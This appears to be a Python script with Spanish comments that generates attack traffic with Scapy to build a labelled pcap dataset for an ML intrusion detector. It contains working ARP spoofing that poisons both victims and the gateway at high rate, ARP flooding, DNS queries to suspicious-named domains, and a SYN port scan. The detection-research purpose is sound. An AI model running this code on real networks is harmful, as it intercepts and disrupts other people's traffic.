#!/usr/bin/env python3
"""
Simulador INTENSO de ataques MITM para entrenamiento CNN + Bi-LSTM
"""

from scapy.all import *
import time
import random
import subprocess
import os
import signal
from datetime import datetime

class SimpleAttackSimulator:
    def __init__(self, interface="eth0", your_ip="10.42.0.1"):
        self.interface = interface
        self.your_ip = your_ip
        self.gateway = self.get_gateway()
        self.running = False
        print(f"[+] Gateway detectado: {self.gateway}")
    
    def get_gateway(self):
        """Detectar gateway automáticamente"""
        try:
            result = subprocess.check_output("ip route | grep default", shell=True)
            gateway = result.decode().split()[2]
            return gateway
        except:
            return "192.168.11.1"  # Fallback
    
    def simulate_arp_anomalies(self, duration=300):
        """Simular MITM ARP INTENSO (como ataque real)"""
        print(f"[+] 🚨 INICIANDO ATAQUE ARP MITM INTENSO")
        print(f"[+] Duración: {duration}s")
        print(f"[+] Gateway: {self.gateway}")
        print(f"[+] Interfaz: {self.interface}")
        
        start_time = time.time()
        self.running = True
        
        # MACs falsas
        fake_mac = RandMAC()
        
        # IPs víctimas (simular varios dispositivos)
        victim_ips = [f"192.168.11.{i}" for i in range(10, 20)]
        
        packet_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            # ═══════════════════════════════════════════════
            # ATAQUE 1: ARP Spoofing bidireccional INTENSO
            # ═══════════════════════════════════════════════
            for victim_ip in random.sample(victim_ips, 3):
                # Envenenar víctima (decirle que somos el gateway)
                send(ARP(
                    op=2,  # is-at (reply)
                    psrc=self.gateway,  # IP del gateway
                    pdst=victim_ip,     # IP de la víctima
                    hwdst="ff:ff:ff:ff:ff:ff",  # Broadcast
                    hwsrc=str(fake_mac)  # Nuestra MAC falsa
                ), iface=self.interface, verbose=False)
                
                # Envenenar gateway (decirle que somos la víctima)
                send(ARP(
                    op=2,
                    psrc=victim_ip,
                    pdst=self.gateway,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    hwsrc=str(fake_mac)
                ), iface=self.interface, verbose=False)
                
                packet_count += 2
            
            # ═══════════════════════════════════════════════
            # ATAQUE 2: ARP Requests masivos (escaneo)
            # ═══════════════════════════════════════════════
            for _ in range(10):
                fake_ip = f"192.168.11.{random.randint(100, 254)}"
                send(ARP(
                    op=1,  # who-has (request)
                    pdst=fake_ip,
                    psrc=self.your_ip
                ), iface=self.interface, verbose=False)
                packet_count += 1
            
            # ═══════════════════════════════════════════════
            # ATAQUE 3: Gratuitous ARP anómalos
            # ═══════════════════════════════════════════════
            for _ in range(5):
                send(ARP(
                    op=2,
                    psrc=self.gateway,
                    pdst=self.gateway,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    hwsrc=str(RandMAC())
                ), iface=self.interface, verbose=False)
                packet_count += 1
            
            # ═══════════════════════════════════════════════
            # CLAVE: Sleep MUY CORTO (ataque sostenido)
            # ═══════════════════════════════════════════════
            time.sleep(0.05)  # ← 20 ciclos/segundo = ~400 ARP/s
            
            # Log cada 10 segundos
            elapsed = int(time.time() - start_time)
            if elapsed % 10 == 0 and elapsed > 0:
                rate = packet_count / elapsed
                print(f"[+] {elapsed}s | {packet_count} paquetes ARP | {rate:.1f} ARP/s")
    
    def simulate_dns_anomalies(self, duration=300):
        """Simular consultas DNS anómalas"""
        print(f"[+] Simulando anomalías DNS por {duration} segundos")
        
        start_time = time.time()
        self.running = True
        
        suspicious_domains = [
            "malicious-site.com", "phishing-bank.net", "fake-update.org",
            "suspicious-download.info", "malware-host.biz", "c2-server.ru"
        ]
        
        while self.running and (time.time() - start_time) < duration:
            # Ráfaga de consultas DNS (comportamiento de malware)
            for _ in range(20):
                domain = random.choice(suspicious_domains)
                dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                send(dns_query, verbose=False)
                time.sleep(0.02)
            
            time.sleep(1)
    
    def simulate_port_scan(self, duration=300):
        """Simular escaneo de puertos agresivo"""
        print(f"[+] Simulando escaneo de puertos por {duration} segundos")
        
        start_time = time.time()
        self.running = True
        
        target_ips = [f"192.168.11.{i}" for i in range(1, 20)]
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 3389, 8080]
        
        while self.running and (time.time() - start_time) < duration:
            target_ip = random.choice(target_ips)
            
            # Escaneo rápido de múltiples puertos
            for port in random.sample(common_ports, 5):
                # SYN scan
                send(IP(dst=target_ip)/TCP(dport=port, flags="S"), verbose=False)
            
            time.sleep(0.1)

def capture_with_simulation(attack_type, duration=300, interface="eth0"):
    """Capturar tráfico mientras se simula ataque"""
    
    os.makedirs('data/raw/mitm', exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"data/raw/mitm/mitm_{attack_type}_{timestamp}.pcap"
    
    cmd = f"sudo tcpdump -i {interface} -w {filename}"
    capture_process = subprocess.Popen(cmd.split())
    
    print(f"[+] Captura iniciada: {filename}")
    
    simulator = SimpleAttackSimulator(interface=interface)
    
    try:
        if attack_type == "arp":
            simulator.simulate_arp_anomalies(duration)
        elif attack_type == "dns":
            simulator.simulate_dns_anomalies(duration)
        elif attack_type == "portscan":
            simulator.simulate_port_scan(duration)
        
    except KeyboardInterrupt:
        print("\n[!] Simulación interrumpida")
    finally:
        simulator.running = False
        capture_process.send_signal(signal.SIGTERM)
        capture_process.wait()
        print(f"[+] Captura guardada: {filename}")
        return filename

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Simulador INTENSO de ataques MITM')
    parser.add_argument('--attack', choices=['arp', 'dns', 'portscan'], 
                       required=True, help='Tipo de ataque')
    parser.add_argument('--duration', type=int, default=60, help='Duración (segundos)')
    parser.add_argument('--interface', default='eth0', help='Interfaz de red')
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[-] Requiere root: sudo python3 ...")
        exit(1)
    
    filename = capture_with_simulation(args.attack, args.duration, args.interface)
    print(f"\n✅ Listo! Archivo: {filename}")
    print("Siguiente paso: python3 scripts/extract_features.py --pcap {filename} --label 1")